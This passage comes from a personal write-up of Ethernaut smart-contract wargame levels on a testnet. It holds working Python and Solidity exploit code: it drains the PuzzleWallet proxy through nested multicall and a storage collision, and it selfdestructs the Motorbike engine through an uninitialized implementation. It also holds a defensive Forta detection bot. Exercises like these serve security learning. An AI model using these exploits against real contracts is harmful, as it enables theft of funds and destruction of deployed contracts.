6. After draining the contract, you can now call `setMaxBalance()` by passing in your address casted as an integer, which will make `maxBalance` and therefore `admin` your address.

### How I did it

As described in [solution](#solution-22), but with a few resourceful changes in order to simplify the python code.

1. Get the position in the proxy contract's storage which contains the address of the implementation contract. I do this in order to be able to encode the calls to certain methods in this contract, which I could technically do manually by constructing a short JSON and encoding it as ABI, but using the contract code instance is easier. I think it's also possible to deploy an instance of the PuzzleWallet contract in order to do it.

```python
storage_position_impl_address = hex(int(web3.sha3(text='eip1967.proxy.implementation').hex(),16)-1)
implementation_address = f'0x{web3.eth.get_storage_at(puzzleproxy.address, storage_position_impl_address).hex()[-40:]}'
```

2. Get the PuzzleWallet contract instance and assign it to an object in python in order to encode the contract calls that will be passed to the proxy contract through the tx data.

```python
puzzlewallet = PuzzleWallet.at(implementation_address)
```

3. Call `proposeNewAdmin()` to become `pendingAdmin`

```python
puzzleproxy.proposeNewAdmin(acc.address, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xbd43b12ff9139f8e9916c46f7e2df7128c34bf6419130c2992d656d7df7453a1

Every single step after this one will perform a tx that sends tx data to the proxy contract in order to perform the delegate calls to the PuzzleWallet contract.

4. Call the `addToWhitelist()` function in order to whitelist my address

```python
whitelist_address_data = puzzlewallet.addToWhitelist.encode_input(acc.address)
acc.transfer(to=puzzleproxy.address, amount=0, data=whitelist_address_data)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xfbc79616c75d96e8a0d176b88197521a18b688bfc6286f01fb904335300c56c5

5. Create the multicall bundled transaction and call `multicall()` as specified in [solution](#solution-22) step 3.

```python
# multicall tx data
deposit_data = puzzlewallet.deposit.encode_input()
multicall_data = puzzlewallet.multicall.encode_input([deposit_data])
# nest the call
multicall_data = puzzlewallet.multicall.encode_input([deposit_data, multicall_data]) 
acc.transfer(to=puzzleproxy.address, amount=puzzleproxy.balance(), data=multicall_data)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x6e33c31f232cfb459d4bbd13f296a52be0606c680bde05732fd207f06306d205

6. Perform the withdrawal of all contract's funds by calling `execute()`.

```python
execute_data = puzzlewallet.execute.encode_input(acc.address, puzzleproxy.balance(), "")
acc.transfer(to=puzzleproxy.address, amount=0, data=execute_data)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xc856e1a011cc5405e67956a40ea59754342b41002ff860eeeb21b4b4ee949b97

7. Call `setMaxBalance()` in order to become `admin`

```python
max_balance_data = puzzlewallet.setMaxBalance.encode_input(int(acc.address, 16))
acc.transfer(to=puzzleproxy.address, amount=0, data=max_balance_data)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x3eae8adb1340f9e1837061e7150eeb863e35d2c403c86f0074389017c78e1903

8. Check if I'm admin

```python
# check if my address is the admin address
admin_assertion = puzzleproxy.admin() == acc.address
print(f'The admin of the contract is {acc.address}, therefore my address is admin: {admin_assertion}')
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x6bce85a663ae4b8b5d19fcc8b6fa400d2dc34b597dd67ce556107819e0742b36

***

## Motorbike

### Objectives

Would you be able to `selfdestruct` its engine and make the motorbike unusable ?

#### Solution

The Engine contract inherits from Initializable, which means the initializer function is restricted to be called once. However, because the Engine is the implementation and Motorbike is the proxy, the initializer modifier doesn't restrict EOAs or other contracts from calling the `initialize()` function and through `upgradeToAndCall()` effectively passing any call to the implementation. The call is passed through the `_upgradeToAndCall()` function in a `delegatecall`, this way we just deploy a malicious contract with `selfdestruct()` call in a function and call this function as if the caller was the engine contract.

The steps to reproduce it are simple:

1. Get the address of the Engine implementation, as defined in Motorbike identical to how they're usually defined in an Upgradeable Proxy contract
   
2. Call the `initialize()` function to become `upgrader` and be able to pass calls to the `_authorizeUpgrade()` function

3. Deploy a malicious contract with a single function that can self destruct the contract.

4. Call the function that would normally self destructs the malicious contract through a `delegatecall` in `upgradeToAndCall()` in the Engine contract by passing in the malicious contract address as `newImplementation` and the data that would call the function as `data`. After this, the Engine implementation contract will be destroyed.

### How I did it

1. Find the implementation address of the Engine contract

```python
# find engine contract implementation
storage_position_impl_address = hex(int(web3.sha3(text='eip1967.proxy.implementation').hex(),16)-1)
implementation_address = f'0x{web3.eth.get_storage_at(motorbike.address, storage_position_impl_address).hex()[-40:]}'

# load Engine contract
eg = Engine.at(implementation_address)
```

2. Call `initialize()` in the Engine contract

```python
# initialize the engine implementation
eg.initialize(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x79c0e38730d584e33f5e291452c09ae91542f349bd8772dedf451b4d58b3275a

3. Deploy a BombEngine contract (at: `0x89a05702875f0c18FF5B28640ea3DdE39FDe6E47`) with only a single function that can self destruct such contract

```js
function boom() public {
    selfdestruct(address(0));
}
```

```python
# deploy our bomb engine contract
be = BombEngine.deploy(_from)
```
4. Call `UpgradeToAndCall()` in the Engine implementation contract as described in [solution](#solution-23).

```python
# call upgradeToAndCall() to selfdestruct the Engine implementation contract
selfdestruct_call = be.boom.encode_input()
eg.upgradeToAndCall(be.address, selfdestruct_call, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x93e405003cb3065ae97a1c2d493eeba85a9b5f85f1db6b4fa0d27f3847ee23b6

5. Confirm that the contract has been successfully destroyed by checking if we can call the getter function for one of the state variables, in this case `upgrader()`

```python
try:
    # call the getter function
    eg.upgrader()

    # print if it didnt fail
    print('The contract was not successfully self destructed')

    # return that it failed
    return False
except:
    # print if it failed
    print('The contract was successfully self destructed')
    
    # return that it succeeded
    return True
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0xbc0466a3268b594bb4c1273a022e188c359a0d26c379ee265f5a095ea17b0fce


***

## DoubleEntryPoint

### Objectives

Your job is to implement a detection bot and register it in the Forta contract. The bot's implementation will need to raise correct alerts to prevent potential attacks or bug exploits.

#### Solution

The vulnerability in the CryptoVault contract is present in the `sweepToken()` function. There's two ways we can sweep the DoubleEntryPoint tokens:

1. By calling `sweepToken()` and passing the DoubleEntryPoint token contract address

2. By calling `sweepToken()` and passing the LegacyToken token contract address

There's a require statement in the function which compares if this token contract address is the `underlying` token contract address defined (or modified) by the `setUnderlying()` function (which we can't call because the `underlying` token contract address is not the null address) is the DoubleEntryPoint token contract address, however, it does NOT check if it's the LegacyToken token contract address. 

When we pass the LegacyToken token contract address, the LegacyToken contract will receive the transfer call and instead delegate this transfer to the DoubleEntryPoint token contract, which will result in these tokens moving when `sweepToken()` is called.

As we can see in the DoubleEntryPoint token contract, we have the ability to use the Forta contract to create a detection bot, essentially, another contract that will trigger an alert when an otherwise unexpected event occurs. 

To protect against the CryptoVault vulnerability, we have create a detection bot contract which checks whether the CryptoVault contract is the one attempting to transfer the tokens out of the contract. If the CryptoVault address is found in the calldata of that function call, then we prevent the contract from transferring the tokens and revert the transaction by raising the alert. If the alert counter increases, then the transaction is reverted.

To do this we can either pull the data directly from the calldata by knowing where the `origSender` address (parameter of the `delegateTransfer()` function in the DoubleEntryPoint token contract) is within that calldata, so essentially what its offset is. This can be deducted by knowing how calldata is layed out. Once we know the offset, we can pull the data from that offset and compare it to the CryptoVault address. If `origSender` is the CryptoVault address, we raise the alert.

Alternatively, we can go byte by byte within that calldata until we find the offset where `origSender` is located and compare it with the CryptoVault address. Once the loop reaches this point and we successfully make the comparison, then the transaction will either continue (if `origSender` is not the CryptoVault address) or be reverted (if `origSender` is the CryptoVault address).

### How I did it

1. Get the CryptoVault contract address from the DoubleEntryPoint `cryptoVault` state variable.

```python
# get cryptovault address
cryptovault_address = dep.cryptoVault()
```

2. Instantiate the CryptoVault contract. I do this to later call `sweepToken()` in order to test my detection bot

```python
cryptovault = CryptoVault.at(cryptovault_address)
```

3. Get the Forta contract address and instantiate the Forta contract to later call `setDetectionBot()`

```python
forta = Forta.at(dep.forta())
```

4. Code and deploy (at: `0xA662bD0c21450a80c5B3fCA07709771Eb720EcB6`) DetectionBot contract that raises an alert if the CryptoVault address is found in the calldata when `sweepToken()` is called. I decided to code this using a loop which goes over every offset of the calldata (up until a max of the total size of the calldata in bytes, in this case 228 bytes). I recognize this is less efficient than simply figuring out where `origSender` is in the calldata, but I wanted to try solving the problem how I would otherwise do it in a different programming language that I'm more familiar with. This is a sort of 'bruteforce' type way to find it, but for the time being, I'm okay with that.

That said, I coded the `handleTransaction()` function as follows:

```js
function handleTransaction(address user, bytes calldata) public override {
    uint dataValue;
    uint calldataloadPos = 4;
    uint _calldatasize;

    // get calldata size (in bytes) so the loop ends where the data ends
    assembly {
        _calldatasize := calldatasize()
    }

    while (calldataloadPos < _calldatasize) {
        // obtain the next 32-byte item from the calldata
        assembly {
            dataValue := calldataload(calldataloadPos)
        }

        // check if the address is present in the next 32 byte slot
        if (dataValue == uint256(uint160(cryptoVault))) {
            // raise alert if address is present in calldata
            forta.raiseAlert(user);
            break;

        } else {
            // add one to calldataloadpos
            assembly {
                calldataloadPos := add(calldataloadPos, 0x1)
            }
        }
    }
}
```

The deployment is done in python as follows:

```python
bot = DetectionBot.deploy(cryptovault_address, forta.address, _from)
```

5. Set the detection bot calling `setDetectionBot()` in the forta contract with the bot contract address

```python
forta.setDetectionBot(bot.address, _from)
```

6. Get the LegacyToken token contract address to later pass it as a parameter to `sweepToken()` in CryptoVault

```python
# get the legacy token contract address
legacytoken = dep.delegatedFrom()
```

7. Try sweeping the tokens while allowing the transaction to revert 

```python
cryptovault.sweepToken(legacytoken, _from | {'allow_revert':True})
```

8. Check if the revert message is the correct one (meaning the alert was triggered)

```python
revert_msg_assertion = history[-1].revert_msg == 'Alert has been triggered, reverting'
print(f"The transaction triggered the forta alert: {revert_msg_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x3edb0cb77a9b738b830f6fe7b7b460b2a698ec70d36f66097ca71b9c7c389ce2
